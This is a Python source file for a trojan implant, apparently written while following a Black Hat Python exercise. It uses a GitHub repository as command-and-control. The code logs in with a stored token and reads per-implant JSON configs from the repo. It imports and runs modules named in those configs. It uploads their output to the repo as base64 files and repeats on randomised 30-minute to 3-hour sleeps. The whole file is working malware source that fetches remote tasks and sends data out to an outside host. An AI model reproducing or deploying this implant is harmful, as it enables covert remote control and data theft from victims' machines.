import base64
import github3
import github3.repos
import json
import sys
import threading
import random
import time
from datetime import datetime

def github_connect() -> github3.repos.Repository:
    with open('my_token.txt') as f:
        token = f.read().strip()
        
    user = 'ybvy'
    repo_name = 'bhptrojan'
    
    sess = github3.login(token=token)
    return sess.repository(user, repo_name)

def get_file_contents(dirname, module_name, repo: github3.repos.Repository) -> bytes:
    file = repo.file_contents(f'{dirname}/{module_name}')
    return base64.b64decode(file.content)

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
        
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(config_json)
        
        for task in config:
            if task['module'] not in sys.modules:
                exec(f"import {task['module']}")
        
        return config
    
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)
        
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
        
    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                threading.Thread(target=self.module_runner, args=(task['module'], )).start()
                
            time.sleep(random.randint(30*60, 3*60*60))